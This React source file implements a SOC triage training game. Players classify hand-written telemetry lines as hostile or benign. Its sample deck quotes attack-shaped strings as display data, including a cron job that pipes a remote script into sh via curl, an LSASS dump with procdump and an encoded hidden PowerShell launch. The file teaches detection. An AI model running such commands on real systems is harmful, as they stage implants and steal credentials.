import { useEffect, useMemo, useRef, useState } from 'react'
import { useReducedMotion } from '@/lib/useReducedMotion'

/** Fired by the terminal / palette to start a shift. */
export const GAME_EVENT = 'triage:open'

interface Sig {
  src: string
  line: string
  hostile: boolean
  why: string
}

// The deck — hand-written telemetry. Half of it wants to ruin your weekend,
// half of it is just a Tuesday. Knowing which is which is the whole job.
const DECK: Sig[] = [
  { src: 'edr · proc_creation', line: 'WINWORD.EXE → powershell.exe -nop -w hidden -enc JABzAD0A…', hostile: true, why: 'Word should never spawn an encoded shell — maldoc foothold.' },
  { src: 'edr · proc_access', line: 'procdump64.exe read handle → lsass.exe (0x1FFFFF)', hostile: true, why: 'LSASS memory dump = credential theft (T1003).' },
  { src: 'linux · cron', line: 'cron[2211]: curl -s http://185.220.101.4/i.sh | sh', hostile: true, why: 'Piping a remote script to sh from cron — implant staging.' },
  { src: 'dns · resolver', line: 'TXT? 3a9f7c1e02b44d18a6…x92.badcdn-metrics.top (238 bytes)', hostile: true, why: 'Long random TXT queries to a fresh domain — DNS tunneling.' },
  { src: 'auth · windows', line: '4625 ×347 · 42 accounts · single source 10.6.3.77 · 4 min', hostile: true, why: 'One source, many accounts, short window — password spray.' },
  { src: 'netflow · firewall', line: 'iot-cam-12 → 10.10.8.5:445 ALLOW (iot→corp)', hostile: true, why: 'IoT segment must never reach corp SMB — segmentation breach.' },
  { src: 'edr · proc_creation', line: 'rundll32.exe from C:\\Users\\Public\\Temp\\ — no arguments', hostile: true, why: 'Bare rundll32 outside System32 is a classic loader.' },
  { src: 'windows · services', line: 'new service "WinUpdatee" → C:\\Users\\Public\\svc.exe', hostile: true, why: 'Typosquatted service name, user-writable path — persistence.' },
  { src: 'edr · proc_creation', line: 'services.exe → svchost.exe -k netsvcs', hostile: false, why: 'Textbook parentage — this is how svchost is born.' },
  { src: 'netflow · storage', line: 'backup-agent → filer01 · 412 GB read · 02:00–03:40', hostile: false, why: 'Scheduled backup window. Big reads at 2am are its job.' },
  { src: 'proxy · egress', line: 'dev-ws-07: pip install requests (pypi.org via corp proxy)', hostile: false, why: 'A developer installing requests is Tuesday, not an incident.' },
  { src: 'edr · file_write', line: 'chrome.exe wrote GoogleUpdate.exe (signed, Program Files)', hostile: false, why: 'Signed updater updating itself in the right path.' },
  { src: 'auth · rdp', line: 't2-admin → srv-db-02 via jump-host-01 · CHG-4412 window', hostile: false, why: 'Admin via the jump host inside an approved change window.' },
  { src: 'dns · resolver', line: 'AAAA burst for cdn.office.net after KB5040442 rollout', hostile: false, why: 'Patch-day CDN chatter. Noisy, known, benign.' },
  { src: 'windows · services', line: 'spooler restart by helpdesk-fix.ps1 (signed, ticket #8841)', hostile: false, why: 'Ticketed helpdesk script doing helpdesk things.' },
  { src: 'pki · monitor', line: 'mail.corp cert renewed · SAN unchanged · 90d validity', hostile: false, why: 'Routine renewal, same SANs — the system working.' },
]

const ROUNDS = 12
const SECS = 7

const shuffle = <T,>(a: T[]): T[] => {
  const r = [...a]
  for (let i = r.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1))
    ;[r[i], r[j]] = [r[j], r[i]]
  }
  return r
}

function rank(score: number): string {
  if (score >= 900) return 'SOC LEAD — take my seat'
  if (score >= 600) return 'ANALYST — shift well held'
  if (score >= 300) return 'TRAINEE — the SIEM believes in you'
  return 'INSIDER THREAT? — report to HR'
}

interface Tally {
  tp: number
  tn: number
  fp: number
  fn: number
  slow: number
}

export function TriageGame() {
  const reduced = useReducedMotion()
  // Mounted by the first triage:open event, so the first shift starts open.
  const [open, setOpen] = useState(true)
  const [deck, setDeck] = useState<Sig[]>([])
  const [round, setRound] = useState(0)
  const [score, setScore] = useState(0)
  const [tally, setTally] = useState<Tally>({ tp: 0, tn: 0, fp: 0, fn: 0, slow: 0 })
  const [feedback, setFeedback] = useState<{ good: boolean; text: string } | null>(null)
  const [left, setLeft] = useState(SECS)
  const [done, setDone] = useState(false)
  const panelRef = useRef<HTMLDivElement>(null)
  const restoreRef = useRef<HTMLElement | null>(null)
  const tickRef = useRef<number>()

  const start = () => {
    setDeck(shuffle(DECK).slice(0, ROUNDS))
    setRound(0)
    setScore(0)
    setTally({ tp: 0, tn: 0, fp: 0, fn: 0, slow: 0 })
    setFeedback(null)
    setLeft(SECS)
    setDone(false)
  }

  // First shift deals on mount; later triage:open events re-open and re-deal.
  useEffect(() => {
    start()
    const onOpen = () => {
      setOpen(true)
      start()
    }
    window.addEventListener(GAME_EVENT, onOpen)
    return () => window.removeEventListener(GAME_EVENT, onOpen)
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [])

  // Focus in on open, restore on close, lock scroll.
  useEffect(() => {
    if (!open) return
    restoreRef.current = document.activeElement as HTMLElement | null
    document.documentElement.style.overflow = 'hidden'
    requestAnimationFrame(() =>
      panelRef.current?.querySelector<HTMLElement>('button')?.focus(),
    )
    return () => {
      document.documentElement.style.overflow = ''
      restoreRef.current?.focus?.()
    }
  }, [open])

  const sig = deck[round]

  const call = (escalate: boolean | null) => {
    if (!sig || done) return
    let good: boolean
    let text: string
    let pts: number
    if (escalate === null) {
      // SLA breach — the alert aged out of the queue.
      if (sig.hostile) {
        good = false
        pts = -150
        text = `MISSED — it's in. ${sig.why}`
        setTally((t) => ({ ...t, fn: t.fn + 1, slow: t.slow + 1 }))
      } else {
        good = false
        pts = -10
        text = 'Aged out. Benign, but the queue does not work itself.'
        setTally((t) => ({ ...t, slow: t.slow + 1 }))
      }
    } else if (escalate && sig.hostile) {
      good = true
      pts = 100
      text = `CAUGHT — ${sig.why}`
      setTally((t) => ({ ...t, tp: t.tp + 1 }))
    } else if (!escalate && !sig.hostile) {
      good = true
      pts = 50
      text = `CLEAN DISMISS — ${sig.why}`
      setTally((t) => ({ ...t, tn: t.tn + 1 }))
    } else if (escalate && !sig.hostile) {
      good = false
      pts = -75
      text = `FALSE POSITIVE — IR paged at 3am for nothing. ${sig.why}`
      setTally((t) => ({ ...t, fp: t.fp + 1 }))
    } else {
      good = false
      pts = -150
      text = `DISMISSED A THREAT — dwell time starts now. ${sig.why}`
      setTally((t) => ({ ...t, fn: t.fn + 1 }))
    }
    setScore((s) => s + pts)
    setFeedback({ good, text })

    if (round + 1 >= ROUNDS) {
      setDone(true)
    } else {
      setRound((r) => r + 1)
      setLeft(SECS)
    }
  }

  // Per-alert clock. Pauses while the tab is hidden — alerts don't age when
  // nobody is on shift.
  useEffect(() => {
    if (!open || done || !sig) return
    tickRef.current = window.setInterval(() => {
      if (document.hidden) return
      setLeft((l) => l - 1)
    }, 1000)
    return () => window.clearInterval(tickRef.current)
  }, [open, done, round, sig])

  useEffect(() => {
    if (left <= 0 && open && !done) call(null)
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [left])

  // Keys: E escalate · D dismiss · Escape quit.
  useEffect(() => {
    if (!open) return
    const onKey = (e: KeyboardEvent) => {
      if (e.key === 'Escape') setOpen(false)
      else if (!done && e.key.toLowerCase() === 'e') call(true)
      else if (!done && e.key.toLowerCase() === 'd') call(false)
    }
    window.addEventListener('keydown', onKey)
    return () => window.removeEventListener('keydown', onKey)
  })

  const precision = useMemo(() => {
    const denom = tally.tp + tally.fp
    return denom ? Math.round((tally.tp / denom) * 100) : 100
  }, [tally])

  if (!open) return null

  return (
    <div
      className="fixed inset-0 z-[260] flex items-center justify-center bg-black/70 px-4 backdrop-blur-sm"
      role="dialog"
      aria-modal="true"
      aria-label="Triage Rush — SOC mini game"
      onClick={() => setOpen(false)}
    >
      <div
        ref={panelRef}
        onClick={(e) => e.stopPropagation()}
        className="w-full max-w-lg overflow-hidden rounded-xl border border-hairline bg-surface shadow-2xl shadow-black/60"
      >
        {/* header */}
        <div className="flex items-center justify-between border-b border-hairline px-5 py-3 font-mono text-xs">
          <span className="text-accent">TRIAGE RUSH · one shift, {ROUNDS} alerts</span>
          <span className="flex items-center gap-4 text-faint">
            <span>
              score <span className="text-fg tabular-nums">{score}</span>
            </span>
            <button
              type="button"
              onClick={() => setOpen(false)}
              className="text-faint transition-colors hover:text-accent"
              aria-label="Close game"
            >
              esc ✕
            </button>
          </span>
        </div>

        {!done && sig ? (
          <div className="p-5">
            <div className="flex items-center justify-between font-mono text-[0.65rem] text-faint">
              <span>
                alert {String(round + 1).padStart(2, '0')}/{ROUNDS} · {sig.src}
              </span>
              <span className={left <= 2 ? 'text-threat' : ''}>{left}s</span>
            </div>
            {/* SLA bar */}
            <div className="mt-2 h-px w-full overflow-hidden bg-hairline" aria-hidden>
              <div
                className={left <= 2 ? 'h-full bg-threat' : 'h-full bg-accent'}
                style={{
                  width: `${(left / SECS) * 100}%`,
                  transition: reduced ? 'none' : 'width 1s linear',
                }}
              />
            </div>

            <div className="mt-5 min-h-[5.5rem] rounded-lg border border-hairline bg-[#0c0b0a] p-4">
              <p className="break-words font-mono text-xs leading-relaxed text-fg">{sig.line}</p>
            </div>

            <div className="mt-5 grid grid-cols-2 gap-3">
              <button
                type="button"
                onClick={() => call(true)}
                className="rounded-lg border border-accent/50 bg-accent/10 py-3 font-mono text-sm text-accent transition-colors hover:border-accent hover:bg-accent/20"
              >
                escalate <kbd className="ml-1 text-[0.6rem] text-faint">E</kbd>
              </button>
              <button
                type="button"
                onClick={() => call(false)}
                className="rounded-lg border border-data/40 bg-data/5 py-3 font-mono text-sm text-data transition-colors hover:border-data/80 hover:bg-data/10"
              >
                dismiss <kbd className="ml-1 text-[0.6rem] text-faint">D</kbd>
              </button>
            </div>

            <p
              aria-live="polite"
              className={`mt-4 min-h-[2.4rem] font-mono text-[0.7rem] leading-relaxed ${
                feedback ? (feedback.good ? 'text-data' : 'text-threat') : 'text-faint'
              }`}
            >
              {feedback ? feedback.text : 'Real telemetry shapes. Call it before the SLA bar dies.'}
            </p>
          </div>
        ) : (
          <div className="p-5">
            <p className="font-mono text-xs text-faint">— END OF SHIFT —</p>
            <p className="mt-3 font-display text-3xl font-semibold tracking-tight text-fg">
              {score} <span className="text-base text-faint">pts</span>
            </p>
            <p className="mt-1 font-mono text-sm text-accent">{rank(score)}</p>
            <div className="mt-5 grid grid-cols-2 gap-x-6 gap-y-1.5 font-mono text-xs text-muted sm:grid-cols-3">
              <span>caught: <span className="text-data">{tally.tp}</span></span>
              <span>clean dismissals: <span className="text-data">{tally.tn}</span></span>
              <span>false positives: <span className="text-threat">{tally.fp}</span></span>
              <span>missed threats: <span className="text-threat">{tally.fn}</span></span>
              <span>SLA breaches: <span className="text-threat">{tally.slow}</span></span>
              <span>precision: <span className="text-fg">{precision}%</span></span>
            </div>
            <div className="mt-6 flex gap-3">
              <button
                type="button"
                onClick={start}
                className="rounded-full border border-accent/50 bg-accent/10 px-5 py-2 font-mono text-sm text-accent transition-colors hover:border-accent hover:bg-accent/20"
              >
                next shift ↻
              </button>
              <button
                type="button"
                onClick={() => setOpen(false)}
                className="rounded-full border border-hairline px-5 py-2 font-mono text-sm text-muted transition-colors hover:text-fg"
              >
                clock out
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  )
}
